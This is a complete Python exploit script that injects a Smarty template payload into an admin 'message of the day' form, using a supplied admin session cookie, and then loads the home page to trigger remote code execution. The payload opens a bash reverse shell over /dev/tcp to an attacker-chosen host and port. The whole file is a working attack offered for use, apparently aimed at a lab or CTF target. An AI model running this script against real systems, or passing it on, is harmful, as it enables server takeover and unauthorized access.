#!/usr/bin/env python3

import requests 
import traceback
import argparse
from urllib.parse import urljoin

def smartySstiRce(target, lhost, lport, adminSession):
    """
    Update the welcome message to SSTI payload
    target is using Smarty as a backed templating engine 
    """
    updtMessageUrl = urljoin(target, "/admin/update_motd.php")
    admin_cookies = {"PHPSESSID": f"{adminSession}"}
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    sstiPayload = "{php}echo `bash -c \"bash -i >& /dev/tcp/%s/%s 0>&1\"`;{/php}" % (lhost, lport)
    print("[*] SSTI Payload Sent: ", sstiPayload)
    updtMessageData = {"message": f"{sstiPayload}"}
    try:
        updtMessageRes = requests.post(updtMessageUrl, headers=headers, cookies=admin_cookies, data=updtMessageData)
        if "Message set!" in updtMessageRes.text:
            print("[+] Message set. SSTI attack was delivered successfully")
            """
            Trigger the SSTI payload visiting the home page
            """
            homeUrl = urljoin(target, "/index.php")
            print(f"[+] SSTI triggered, check your listener {lhost}:{lport} ")
            requests.get(homeUrl, cookies=admin_cookies)
        else:
            print("[-] Failed to reset the message. SSTI payload was not saved")
    except Exception as e:
        print("[-] Error sending the update message request: ", e)
        traceback.print_exc()

def main():
    parser = argparse.ArgumentParser(description="PHP Smarty SSTI in welcome message RCE")
    parser.add_argument("target", help="Target's base URL (e.g, http://192.168.174.234:80/)")
    parser.add_argument("lhost", help='Attacker IP address')
    parser.add_argument("lport", help="Listener port")
    parser.add_argument("admin_session_token", help="Admin session token")
    args = parser.parse_args()

    smartySstiRce(args.target, args.lhost, args.lport, args.admin_session_token)

if __name__ == "__main__":
    main()
